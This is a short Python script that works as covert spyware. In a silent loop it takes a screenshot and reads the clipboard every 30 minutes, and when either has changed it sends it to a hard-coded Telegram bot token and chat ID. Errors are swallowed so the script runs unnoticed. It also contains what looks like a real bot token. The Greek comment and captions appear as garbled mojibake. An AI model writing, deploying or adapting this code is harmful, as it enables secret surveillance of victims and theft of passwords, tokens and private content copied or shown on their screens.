import time
import os
import pyautogui
import hashlib
import telebot
import pyperclip
from PIL import Image
from io import BytesIO

TOKEN = '7573715897:AAGgNmOxIOrRywzihuF4jFYkBTU9ymvwgn0'
CHAT_ID = "1837395252"

INTERVAL = 1800  # 30 Î»ÎµÏ€Ï„Î¬
LAST_IMG_HASH = None
LAST_CLIP_HASH = None
bot = telebot.TeleBot(TOKEN)

def get_screen_hash():
    img = pyautogui.screenshot()
    buf = BytesIO()
    img.save(buf, format='PNG')
    return hashlib.md5(buf.getvalue()).hexdigest(), buf.getvalue()

def get_clipboard_hash():
    try:
        text = pyperclip.paste()
        return hashlib.md5(text.encode('utf-8')).hexdigest(), text
    except:
        return None, None

def send_screenshot(img_bytes):
    bot.send_photo(CHAT_ID, img_bytes, caption="ðŸ“¸ ÎÎ­Î¿ screenshot ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÏ„Î·ÎºÎµ")

def send_clipboard(text):
    bot.send_message(CHAT_ID, f"ðŸ“‹ ÎÎ­Î¿ Clipboard:\n{text[:4000]}")

while True:
    try:
        new_img_hash, img_bytes = get_screen_hash()
        new_clip_hash, clip_text = get_clipboard_hash()

       

        if LAST_IMG_HASH != new_img_hash:
            send_screenshot(BytesIO(img_bytes))
            LAST_IMG_HASH = new_img_hash

        if clip_text and LAST_CLIP_HASH != new_clip_hash:
            send_clipboard(clip_text)
            LAST_CLIP_HASH = new_clip_hash

    except Exception as e:
        pass

    time.sleep(INTERVAL)
